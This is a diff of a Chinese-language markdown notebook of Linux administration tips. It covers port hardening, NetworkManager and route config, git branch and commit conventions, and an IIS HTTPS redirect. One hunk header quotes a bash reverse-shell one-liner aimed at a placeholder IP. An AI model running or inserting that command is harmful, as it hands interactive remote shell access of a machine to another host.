@@ -187,54 +187,81 @@ bash -i &gt;&amp; /dev/tcp/&lt;被控端ip&gt;/65535 0&gt;&amp;1
 
 ## 服务器默认端口优化   
 1. 检查所有非22开启的端口：`netstat -lntp`  
-```bash
-$&gt; netstat -lntp
-Active Internet connections (only servers)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
-tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      1317/master         
-tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      1/systemd           
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1569/sshd           
-tcp6       0      0 ::1:25                  :::*                    LISTEN      1317/master         
-tcp6       0      0 :::111                  :::*                    LISTEN      1/systemd           
-tcp6       0      0 :::22                   :::*                    LISTEN      1569/sshd 
-```  
+    ```bash
+    $&gt; netstat -lntp
+    Active Internet connections (only servers)
+    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+    tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      1317/master         
+    tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      1/systemd           
+    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1569/sshd           
+    tcp6       0      0 ::1:25                  :::*                    LISTEN      1317/master         
+    tcp6       0      0 :::111                  :::*                    LISTEN      1/systemd           
+    tcp6       0      0 :::22                   :::*                    LISTEN      1569/sshd 
+    ```  
 
 2. 查询`/etc/services`下端口对应的服务：`grep -E &#34;25|111/&#34; /etc/services `   
-```bash 
-$&gt; grep -E &#34;\ 25/|\ 111/&#34; /etc/services 
-smtp            25/tcp          mail
-smtp            25/udp          mail
-sunrpc          111/tcp         portmapper rpcbind      # RPC 4.0 portmapper TCP
-sunrpc          111/udp         portmapper rpcbind      # RPC 4.0 portmapper UD
-```
+    ```bash 
+    $&gt; grep -E &#34;\ 25/|\ 111/&#34; /etc/services 
+    smtp            25/tcp          mail
+    smtp            25/udp          mail
+    sunrpc          111/tcp         portmapper rpcbind      # RPC 4.0 portmapper TCP
+    sunrpc          111/udp         portmapper rpcbind      # RPC 4.0 portmapper UD
+    ```
 
 3. 检查服务的运行状态(第三列为服务名称)： `systemctl list-unit-files |grep -E &#34;rpcbind|portmapper|mail&#34;`, 若单个端口所映射的服务没有查询到，需要通过运行端口的`pid`去查询他具体是属于那个程序的，然后然后去查询具体的服务启动状态。  
-```bash
-$&gt; systemctl list-unit-files |grep -E &#34;rpcbind|portmapper|postfix&#34;
-postfix.service                               enabled 
-rpcbind.service                               enabled 
-rpcbind.socket                                enabled 
-rpcbind.target                                static  
-$&gt; systemctl stop postfix.service rpcbind.service rpcbind.socket     # 关闭启动的服务
-$&gt; systemctl disable postfix.service rpcbind.service rpcbind.socket     # 禁用开机启动
-```
+    ```bash
+    $&gt; systemctl list-unit-files |grep -E &#34;rpcbind|portmapper|postfix&#34;
+    postfix.service                               enabled 
+    rpcbind.service                               enabled 
+    rpcbind.socket                                enabled 
+    rpcbind.target                                static  
+    $&gt; systemctl stop postfix.service rpcbind.service rpcbind.socket     # 关闭启动的服务
+    $&gt; systemctl disable postfix.service rpcbind.service rpcbind.socket     # 禁用开机启动
+    ```
 
 ## linux 下hosts文件和dns服务器的响应顺序
 - 通过修改 `/etc/nsswitch.conf` 进行更换 , 更换`/etc/nsswitch.conf: 86`中的`files`和`dns`的顺序即可  
 
-## git 提交类型 
+## GIT 常见代码规范 
+- 分支命名  
+| 分支      | 说明                                                                                                                                          |
+| :-------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
+| `master`  | 主分支，也是用于部署生产环境的分支。需要确保`master`分支稳定性。`master`分支一般由`release`以及`hotfix`分支合并，任何时间都不能直接修改代码。 |
+| `develop` | 开发分支，始终保持最新完成以及`bug`修复后的代码，用于前后端联调，一般开发的新功能时，`feature`分支都是基于`develop`分支创建的。               |
+| `feature` | 开发新功能时，以`develop`为基础创建`feature`分支。分支命名时可以加上开发的功能模块，命名示例：`feature/user_module`、`feature/cart_module`    |
+| `test`    | 测试分支，专门给测试人员使用，版本相对稳定。                                                                                                  |
+| `release` | 预发布分支，`UAT`测试阶段使用，一般由`test`或`hotfix`分支合并，不建议直接在`release`分支上直接修改代码。                                      |
+| `hotfix`  | 线上出现问题紧急线上出现紧急问题时，需要及时修复，以`master`分支为基线，创建`hotfix`分支，修复完成后，需要合并到`master`分支和`develop`分支。 |
 
-| 类型       | 描述                                                        |
-| :--------- | :---------------------------------------------------------- |
-| `feat`     | 新增 `feature`                                               |
-| `fix`      | 修复 `bug`                                                   |
+- 分支与环境对应关系
+| 分支      | 功能                      | 环境 | 可访问 |
+| --------- | ------------------------- | ---- | :----: |
+| `master`  | 主分支，稳定版本          | PRO  |   是   |
+| `develop` | 开发分支，最新版本        | DEV  |   是   |
+| `feature` | 开发分支，实现新特性      | -    |   否   |
+| `test`    | 测试分支，功能测试        | FAT  |   是   |
+| `release` | 预上线分支，发布新版本    | UAT  |   是   |
+| `hotfix`  | 紧急修复分支，修复线上bug | -    |   否   |
+
+- 单次提交注意事项
+  - 提交问题必须为同一类别的。
+  - 提交问题不要超过`3`个。
+  - 提交的`commit`发现不符合规范，`git commit --amend -m &#34;新的提交信息&#34;` 或 `git reset --hard HEAD` 重新提交一次。
+
+
+- 提交类型
+| 类型       | 说明                                                        |
+| ---------- | ----------------------------------------------------------- |
+| `feat`     | 新增 `feature`                                              |
+| `fix`      | 修复 `bug`                                                  |
 | `docs`     | 仅仅修改了文档，比如`README`, `CHANGELOG`, `CONTRIBUTE`等等 |
 | `style`    | 仅仅修改了空格、格式缩进、都好等等，不改变代码逻辑          |
-| `refactor` | 代码重构，没有加新功能或者修复`bug`                           |
+| `refactor` | 代码重构，没有加新功能或者修复`bug`                         |
 | `perf`     | 优化相关，比如提升性能、体验                                |
 | `test`     | 测试用例，包括单元测试、集成测试等                          |
 | `chore`    | 改变构建流程、或者增加依赖库、工具等                        |
 | `revert`   | 回滚到上一个版本                                            |
+
 
 
 ## linux 通过s3fs挂载七牛云存储
@@ -443,22 +470,22 @@ Jenkins管理界面中打开“Manage Plugins”（管理插件），然后选�
 ## /etc/sysconfig/network-scripts 为空
 - 本来 `/etc/sysconfig/network-scripts` 下是有网卡的配置文件的，我不知道是做了什么事情(我记得只是在调路由表)，在操作了几次后，我就发现我的网卡配置文件都没了，但是网络连接却是正常的，后面经多方资料查询，发现是`NetworkManager`，他会自动管理网卡，而由他管理的话，那么就可能不再需要`/etc/sysconfig/network-scripts/`下的配置文件了。他的默认配置文件是在`/etc/NetworkManager/system-connections`下
 - 如何继续使用`/etc/sysconfig/network-scripts`下的配置文件来继续管理网卡呢
-```bash
-$&gt; sudo vi /etc/NetworkManager/NetworkManager.conf
-[main]
-plugins=ifcfg-rh
-# plugins 的值可以是以下几种：
-# 如果plugins没有显式配置该选项，则NetworkManager将默认启用一组预安装的插件
-# ifcfg-rh：用于读取和解析CentOS、RHEL等发行版相关的网卡配置文件。
-# keyfile：用于从/etc/NetworkManager/system-connections目录中读取网络连接配置信息。
-# dhcp：用于与DHCP服务器进行通信，并获取IP地址、子网掩码、DNS服务器等网络参数。
-# wifi：用于管理Wi-Fi连接，并搜索可用的Wi-Fi热点。
-# ibft、team、bridge 等等
+    ```bash
+    $&gt; sudo vi /etc/NetworkManager/NetworkManager.conf
+    [main]
+    plugins=ifcfg-rh
+    # plugins 的值可以是以下几种：
+    # 如果plugins没有显式配置该选项，则NetworkManager将默认启用一组预安装的插件
+    # ifcfg-rh：用于读取和解析CentOS、RHEL等发行版相关的网卡配置文件。
+    # keyfile：用于从/etc/NetworkManager/system-connections目录中读取网络连接配置信息。
+    # dhcp：用于与DHCP服务器进行通信，并获取IP地址、子网掩码、DNS服务器等网络参数。
+    # wifi：用于管理Wi-Fi连接，并搜索可用的Wi-Fi热点。
+    # ibft、team、bridge 等等
 
-[ifcfg-rh]
-wifi.scan-rand-mac-address=no
-# 用于控制系统在扫描Wi-Fi网络时是否使用随机MAC地址。具体来说，如果将该选项设置为“no”，则系统会使用真实的MAC地址扫描Wi-Fi网络。
-```
+    [ifcfg-rh]
+    wifi.scan-rand-mac-address=no
+    # 用于控制系统在扫描Wi-Fi网络时是否使用随机MAC地址。具体来说，如果将该选项设置为“no”，则系统会使用真实的MAC地址扫描Wi-Fi网络。
+    ```
 
 ## 双网卡优先级配置  
 - 网卡配置文件中 添加`IPV4_ROUTE_METRIC`参数，值越低，优先级越高
@@ -468,17 +495,17 @@ wifi.scan-rand-mac-address=no
 
 ## 网卡配置文件固定路由设置 
 1. 关闭网卡自动路由功能
-```bash
-# /etc/sysconfig/network-scripts/ifcfg-enp0s31f6
-PEERROUTES=no
-```
+    ```bash
+    # /etc/sysconfig/network-scripts/ifcfg-enp0s31f6
+    PEERROUTES=no
+    ```
 2. 添加固定路由
-```bash
-# /etc/sysconfig/network-scripts/route-enp0s31f6
-ADDRESS0=172.16.0.0 # 目标地址
-NETMASK0=255.255.0.0 # 子网掩码
-GATEWAY0=&lt;172.16.31.1&gt; 
-```
+    ```bash
+    # /etc/sysconfig/network-scripts/route-enp0s31f6
+    ADDRESS0=172.16.0.0 # 目标地址
+    NETMASK0=255.255.0.0 # 子网掩码
+    GATEWAY0=&lt;172.16.31.1&gt; 
+    ```
 
 ## acme.sh 证书安装 `--reloadcmd`无效问题
 一般来说，我们在使用自动续签证书的时候，需要让`acme.sh`更新证书后自动重载一下`nginx`,但是我们的`nginx`基本都是自编译的，所以得使用`acme.sh`的`--reloadcmd`参数，但实际上在初始化时候如果你没有指定`--reloadcmd`,那么第一次部署后即使你在更新的自动任务中添加`--reloadcmd`也是无效的，这个时候可以直接修改配置证书的配置文件`/root/.acme.sh/example.com/example.com.conf`，在里面添加一行`Le_ReloadCmd=&#39;/usr/bin/systemctl restart nginx.service&#39;`就可以了。当然，也可以在初始安装证书的时候添加`--reloadcmd`参数，他会给你自动加入这个参数到配置文件中.
@@ -660,25 +687,25 @@ redis_memory_used_bytes / on(hostname) group_left node_memory_MemTotal_bytes
 
 ## IIS http 强制跳转 https 
 - 此项未校验,来源于`chatgpt`
-```xml
-&lt;configuration&gt;
-  &lt;system.webServer&gt;
-    &lt;rewrite&gt;
-      &lt;rules&gt;
-        &lt;rule name=&#34;Force HTTPS&#34; stopProcessing=&#34;true&#34;&gt;
-          &lt;match url=&#34;(.*)&#34; /&gt;
-          &lt;conditions&gt;
-            &lt;add input=&#34;{HTTPS}&#34; pattern=&#34;off&#34; ignoreCase=&#34;true&#34; /&gt;
-          &lt;/conditions&gt;
-          &lt;!-- 临时重定向 --&gt;
-          &lt;!-- &lt;action type=&#34;Redirect&#34; redirectType=&#34;Temporary&#34; url=&#34;https://{HTTP_HOST}/{R:1}&#34; /&gt; --&gt;
-          &lt;action type=&#34;Redirect&#34; redirectType=&#34;Permanent&#34; url=&#34;https://{HTTP_HOST}/{R:1}&#34; /&gt;
-        &lt;/rule&gt;
-      &lt;/rules&gt;
-    &lt;/rewrite&gt;
-  &lt;/system.webServer&gt;
-&lt;/configuration&gt;
-```
+    ```xml
+    &lt;configuration&gt;
+    &lt;system.webServer&gt;
+        &lt;rewrite&gt;
+        &lt;rules&gt;
+            &lt;rule name=&#34;Force HTTPS&#34; stopProcessing=&#34;true&#34;&gt;
+            &lt;match url=&#34;(.*)&#34; /&gt;
+            &lt;conditions&gt;
+                &lt;add input=&#34;{HTTPS}&#34; pattern=&#34;off&#34; ignoreCase=&#34;true&#34; /&gt;
+            &lt;/conditions&gt;
+            &lt;!-- 临时重定向 --&gt;
+            &lt;!-- &lt;action type=&#34;Redirect&#34; redirectType=&#34;Temporary&#34; url=&#34;https://{HTTP_HOST}/{R:1}&#34; /&gt; --&gt;
+            &lt;action type=&#34;Redirect&#34; redirectType=&#34;Permanent&#34; url=&#34;https://{HTTP_HOST}/{R:1}&#34; /&gt;
+            &lt;/rule&gt;
+        &lt;/rules&gt;
+        &lt;/rewrite&gt;
+    &lt;/system.webServer&gt;
+    &lt;/configuration&gt;
+    ```
 
 ## find 文件性能提升
 ```bash
@@ -1026,7 +1053,7 @@ $&gt; rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022
 ## 通过`systemd`服务配置文件修改进程优先级
 &amp;emsp;&amp;emsp; 在`[Service]` 下添加 `Nice=-10`。 `Nice` 进程优先级，`-20`-`19`, 数字越小，优先级越高。 还可以直接修改已启动的进程的优先级 `sudo renice -n -10 -p &lt;pid&gt;`。可以通过`sudo nice -n -10 &lt;command&gt;` 直接在启动时指定 
 
-## git 删除最近几次提交记录 
+## GIT 删除最近几次提交记录 
 ```bash
 # 重置到指定提交 
 $&gt;  git reset --hard &lt;commit id&gt;
